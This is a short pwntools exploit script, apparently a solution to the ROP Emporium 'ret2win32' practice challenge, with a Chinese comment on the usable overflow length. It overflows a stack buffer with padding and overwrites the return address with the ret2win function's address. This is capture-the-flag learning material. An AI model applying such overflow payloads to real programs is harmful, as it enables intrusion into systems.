from pwn import *
from time import sleep
# tip : 填充量 44 总长度 50 , 所以可利用长度为6个字节 只能控制到可用的地址，暂时没想出如何执行自定义的控制流
fpath 	= "./ret2win32"
offset 	= 0x28 + 4

elf = ELF(fpath)
p 	= process(fpath)

if __name__ == '__main__':
	p.recv()

	addr_ret2win   	= elf.symbols["ret2win"]
	payload         = offset * 'a' + p32(addr_ret2win)

	p.sendline(payload)
	sleep(0.1)
	print p.recv()